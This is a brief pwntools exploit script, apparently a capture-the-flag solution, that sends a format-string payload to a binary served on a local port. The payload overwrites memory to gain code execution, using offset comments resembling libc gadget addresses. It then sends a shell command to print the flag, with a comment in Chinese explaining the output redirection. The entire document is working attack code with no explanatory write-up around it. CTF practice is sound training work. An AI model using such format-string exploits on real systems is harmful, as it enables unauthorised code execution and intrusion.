from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './cat'
#io=process(pwnfile)
io=remote('127.0.0.1',32768)

def debug():
	gdb.attach(io)#   b *buffered_vfprintf
	pause()

# 0xebc85 - 0x29d90		13
# 0xebc85 - 0x29e40		33

pay = b'%*13$d%794357c%9$n'

io.sendlineafter("try a try \n",pay)

sleep(0.4)
io.send(b'cat flag 1>&2\n')	#重定向输出
io.interactive()
